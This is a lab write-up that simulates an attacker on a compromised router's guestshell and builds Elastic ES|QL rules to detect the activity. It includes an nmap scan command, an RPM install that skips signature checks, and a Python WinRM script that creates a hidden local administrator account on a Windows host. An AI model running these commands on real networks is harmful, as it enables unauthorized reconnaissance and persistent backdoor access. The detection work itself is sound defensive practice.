# Suspicious Gateway Network Scan

Let's assume that a threat actor gains access to a [branch router](/resources/images/vagrant-lab-virtual-topology.svg) and inspects the router configuration or enables additional features like `iox` to access the `guestshell` (pre-configured in our lab).

By discovering the router configuration, the site-to-site VPN connection becomes visible. Changing the site-to-site connection by adding a new (application) subnet to the tunnel is impossible (because it must be changed on both peers). The traffic will be NATed to the network that is already allowed - the router LAN interface.

Install Nmap from the official RPM into the container:

```bash
sudo rpm -Uvh --nosignature --nodigest --nodeps https://nmap.org/dist/nmap-7.98-1.x86_64.rpm
```

Run an nmap scan:

```bash
sudo nmap -sS -PS22,80,443,135,137-139,445,3389,1433,5985,5986 \
  -p 22,80,443,135,137-139,445,3389,1433,5985,5986 \
  -T3 -sV -n --reason 172.16.20.0/24
```

This type of scan will generate a lot of logs.

<div align="center">
    <img alt="Netflow logs" src="/resources/attack-detect-scenarios/reconnaissance/networkidiscovery-and-port-scanning/Suspicious-Gateway-Network-Scan/images/netflow-logs.png" width="100%">
</div>

You can implement additional logic for these events â€” for example, detect scanning from inside by applying thresholds in EQL or ESQL:

```bash
FROM logs-*
| WHERE data_stream.dataset == "netflow.log"
  AND source.port >= 1024
  AND network.transport == "tcp"
| STATS
    dst_hosts  = COUNT_DISTINCT(destination.ip),
    dst_ports  = COUNT_DISTINCT(destination.port),
    flows      = COUNT(),
    avg_sbytes = AVG(source.bytes)
  BY source.ip
| WHERE dst_hosts >= 100
  AND   dst_ports >= 100
  AND   flows    >= 500
  AND   avg_sbytes <= 1500
| SORT flows DESC
```

| Column         | Meaning                                                                                      |
| -------------- | -------------------------------------------------------------------------------------------- |
| dst_hosts  | Number of unique destination IPs contacted by this source IP during the 5-minute window. |
| dst_ports  | Number of unique destination ports contacted across all those hosts.                     |
| flows      | Total number of flow records generated by this source in that period.                    |
| avg_sbytes | Average number of bytes sent by the source per flow (`source.bytes`).                    |
| source.ip  | The IP address of the system initiating the connections (the suspected scanner).         |


<div align="center">
    <img alt="Netflow scan" src="/resources/attack-detect-scenarios/reconnaissance/networkidiscovery-and-port-scanning/Suspicious-Gateway-Network-Scan/images/netflow-scan.png" width="100%">
</div>

In my case I want to show communication from the gateway (assume that gateway IP addresses end with `.254`), which is anomalous in my environment and occurs very rarely:

```bash
FROM logs-* METADATA _id, _version, _index
| WHERE data_stream.dataset == "netflow.log"
  AND RIGHT(TO_STRING(source.ip), 4) == ".254"
  AND source.port >= 1024
| KEEP @timestamp, source.ip, source.port, destination.ip, destination.port, _id, _version, _index
| SORT @timestamp DESC
| LIMIT 1
```

The `LIMIT 1` acts as a safety mechanism to avoid generating a large number of alerts when a scan is executed from an IP ending in `.254`.

On the guestshell, upgrade pip and install `winrm`:

```bash
python3 -m ensurepip --upgrade
python3 -m venv venv
source venv/bin/activate
pip install --upgrade pip
pip install winrm
```

Enter the Python REPL or create a Python script:

```python
import winrm
s = winrm.Session('172.16.20.230', auth=('vagrant', 'vagrant'))
username = "service-admin"
password = "ServicePass1!"
cmd = 'cmd.exe'
args = ['/c', f'net user {username} "{password}" /add && net localgroup Administrators {username} /add']
r = s.run_cmd(cmd, args)
print(r.std_out.decode(errors='ignore'))
print(r.std_err.decode(errors='ignore'))
```

<div align="center">
    <img alt="Guestshell winrm" src="/resources/attack-detect-scenarios/reconnaissance/networkidiscovery-and-port-scanning/Suspicious-Gateway-Network-Scan/images/guestshell-winrm.png" width="100%">
</div>

The rule was successfully created and tested in the lab. Any port access from the gateway will trigger the rule.

<div align="center">
    <img alt="Elasticsearch rule" src="/resources/attack-detect-scenarios/reconnaissance/networkidiscovery-and-port-scanning/Suspicious-Gateway-Network-Scan/images/rule.png" width="100%">
</div>

From the router perspective, we simulate initial access to the host. This workflow will be developed further in the following sections to show what happens on the Windows VM when a new user is created.
